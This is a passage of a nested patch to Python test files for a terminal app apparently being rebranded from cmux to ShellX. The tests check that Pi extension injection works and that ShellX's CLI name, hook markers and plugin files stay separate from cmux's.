+             root = Path(directory)
+             prompted = run_case(root, args=args)
+-            expected = ["-e", str(root / "tmp/cmux-pi-extensions/surface-test/cmux-session.ts"), *args]
++            expected = ["-e", str(root / "tmp/cmux-pi-extensions/surface-test/shellx-session.ts"), *args]
+             if prompted["args"] != expected or not prompted["extension_exists"]:
+                 raise AssertionError(f"Pi interactive invocation lost extension injection: {prompted}")
+ 
+     with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-") as directory:
+         root = Path(directory)
+         injected = run_case(root)
+         if "-e" not in injected["args"] or not injected["extension_exists"]:
+             raise AssertionError(f"missing bundled Pi extension injection: {injected}")
+ 
+     with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-global-") as directory:
+         root = Path(directory)
+         managed = run_case(root, managed_global=True)
+         if "-e" in managed["args"]:
+             raise AssertionError(f"managed global Pi extension loaded twice: {managed}")
+ 
+     with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-refresh-") as directory:
+         root = Path(directory)
+         refreshed = run_case(root, stale_cached_extension=True)
+-        cached = root / "tmp/cmux-pi-extensions/surface-test/cmux-session.ts"
++        cached = root / "tmp/cmux-pi-extensions/surface-test/shellx-session.ts"
+         if "-e" not in refreshed["args"] or cached.read_text(encoding="utf-8").strip() != f"// {MARKER}":
+             raise AssertionError(f"stale bundled Pi extension was not refreshed: {refreshed}")
+ 
+     with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-disabled-") as directory:
+         root = Path(directory)
+         disabled = run_case(root, disabled=True)
+         if "-e" in disabled["args"] or disabled["extension_exists"]:
+             raise AssertionError(f"Pi hooks disabled still injected extension: {disabled}")
+ 
+     with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-no-extensions-") as directory:
+diff --git a/tests/test_shellx_coexistence.py b/tests/test_shellx_coexistence.py
+index fce11b20c5..dd134601c7 100644
+--- a/tests/test_shellx_coexistence.py
++++ b/tests/test_shellx_coexistence.py
+@@ -118,34 +118,58 @@ class ShellXCoexistenceTests(unittest.TestCase):
+         # `<Application Support|state|cache>/cmux` directory names and `Resources/bin/cmux`.
+         for pat in (r'appendingPathComponent\("cmux"(, isDirectory: (true|false))?\)', r"(?<![\w.])bin/cmux(?![-\w.])"):
+             self.assertEqual(coexistence_offenders(pat), [], pat)
+ 
+     def test_app_runs_and_types_the_shellx_cli(self):
+         # The app finds its bundled CLI by name and types it into terminals (session
+         # restore, welcome banner, wake hint); a bare `cmux` would reach an installed cmux.
+         for pat in (r'forResource: "cmux", withExtension: nil, subdirectory: "bin"',
+                     r'cliStartupExecutableToken = "cmux"', r'fallbackExecutable: "cmux"',
+                     r'typedCommandText = " cmux ', r'"cmux focus-panel ', r'_cmux_wrapper_path "cmux"',
+-                    r"\bwhich cmux \|", r"command -v cmux\b"):
++                    r"\bwhich cmux \|", r"command -v cmux\b", r"command -s cmux\b"):
+             self.assertEqual(coexistence_offenders(pat), [], pat)
+         self.assertIn('public static let cliStartupExecutableToken = "shellx"',
+                       read("Packages/macOS/CMUXAgentLaunch/Sources/CMUXAgentLaunch/AgentRestoreLaunch.swift"))
+ 
+     def test_agent_config_block_markers_are_shellx(self):
+         # Hook blocks ShellX writes into third-party agent configs carry its own markers,
+         # so installing or removing them never touches cmux's blocks.
+         base = "Packages/macOS/CMUXAgentLaunch/Sources/CMUXAgentLaunch/"
+         self.assertIn('"# shellx hooks rovodev begin"', read(base + "RovoDevHookConfig.swift"))
+         self.assertIn('"# shellx hooks hermes-agent begin"', read(base + "HermesAgentHookConfig.swift"))
+         self.assertIn('"# shellx-kimi-hooks-', read(base + "KimiCodeHookConfig.swift"))
+         self.assertEqual(coexistence_offenders(r'"# cmux hooks (rovodev|hermes-agent) |"# cmux-kimi-hooks-'), [])
+ 
++    def test_agent_integration_files_are_shellx(self):
++        # Plugin/extension files, ownership markers, the OpenCode TUI package dir and
++        # the Antigravity hook group are ShellX's own, so installing, refreshing or
++        # removing ShellX's integration never adopts, rewrites or deletes cmux's.
++        for pat in (r"cmux-session\.(js|ts)\b(?!on)", r"cmux-(omp|campfire)-session\.ts", r"cmux-feed\.js",
++                    r"cmux-(pi|amp|omp|campfire)-session-extension-marker", r"cmux-opencode-[a-z-]*marker",
++                    r"cmux-feed-plugin-marker", r'antigravityHookGroupName = "cmux"',
++                    r'openCodeTUIPluginDirectoryName = "cmux"', r'"\./plugins/cmux"', r"plugins/cmux/",
++                    r"\.cmux-session\.lock", r'Symbol\.for\("cmux\.(session|feed|pi)\.'):
++            self.assertEqual(coexistence_offenders(pat), [], pat)
++        catalog = read("CLI/CMUXCLI+AgentHookCatalog.swift")
++        for config_file in ("plugins/shellx-session.js", "extensions/shellx-session.ts", "plugins/shellx-session.ts",
++                            "extensions/shellx-omp-session.ts", "extensions/shellx-campfire-session.ts"):
++            self.assertIn(f'configFile: "{config_file}"', catalog)
++
++    def test_cua_skill_link_policy_manages_only_shellx_bundles(self):
++        # ~/.claude/skills/cmux-cua links into a cmux bundle belong to cmux.
++        policy = read("skills/cmux-cua/link-policy.sh")
++        managed = policy.split("cmux_cua_skill_target_is_managed() {", 1)[1].split("\n}\n", 1)[0]
++        self.assertNotIn("== com.cmuxterm", managed)
++        self.assertIn('"$bundle_id" == pro.shellx.desktop.*', managed)
++        self.assertIn("/Applications/ShellX*.app", managed)
++        self.assertNotRegex(managed, r"/Applications/cmux\*\.app|/tmp/cmux-\*")
++
+     def test_cli_product_is_shellx(self):
+         pbx = read(PBXPROJ)
+         self.assertRegex(pbx, r"PRODUCT_NAME = shellx;")
+         # Both configurations of the cmux-cli target (module name stays internal).
+         for config_id in ("B9000008A1B2C3D4E5F60719", "B9000009A1B2C3D4E5F60719"):
+             settings = build_settings(pbx, config_id)
+             self.assertIn("PRODUCT_NAME = shellx;", settings)
+             self.assertIn("PRODUCT_MODULE_NAME = cmux_cli;", settings)
+         # The product the "Copy CLI" phase puts in Contents/Resources/bin.
+         self.assertIn(
